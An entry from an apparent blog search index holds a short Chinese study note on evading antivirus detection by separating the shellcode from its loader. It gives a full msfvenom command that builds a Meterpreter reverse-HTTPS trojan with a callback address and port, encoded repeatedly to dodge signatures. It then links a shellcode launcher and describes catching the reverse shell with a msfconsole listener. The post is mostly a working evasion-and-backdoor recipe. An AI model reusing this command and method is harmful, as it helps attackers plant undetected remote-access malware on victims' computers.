    <url>%2F2019%2F08%2F02%2Fshellcode%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%2F</url>
    <content type="text"><![CDATA[免杀原理病毒查杀一般分为:特征、行为和云查杀。这些查杀会针对PE头文件的查杀。payload文件越大的时候,越容易被查杀。 本篇文章采用特征与行为分离免杀。避免PE头文件，并且分离行为，与特征的综合免杀。 制作木马用msfvenom生成木马 msfvenom -p windows/meterpreter/reverse_https lhost=192.168.1.112 lport=4444 -e x86/shikata_ga_nai -i5 -f raw &gt; test.c 参数解释 -p:表示payload,因为用tcp的话，通信会被杀毒软件拦截通信导致反弹不了会话,所以使用https通信(因为https会加密) lhost:反弹shell的ip lport:反弹shell的端口 -e:选择编码方式 i:参数指定编码次数 -f:输出格式 下载shellcodeshellcode地址:https://github.com/clinicallyinane/shellcode_launcher/ 反弹shell设置msfconsole监听 记住payload要设置对,反正反弹的shell接收不了 然后用shell执行我们生成的木马就可以反弹shell了 查杀情况 文章声明此方法并非原创]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>shellcode</tag>
      </tags>
  </entry>
</search>
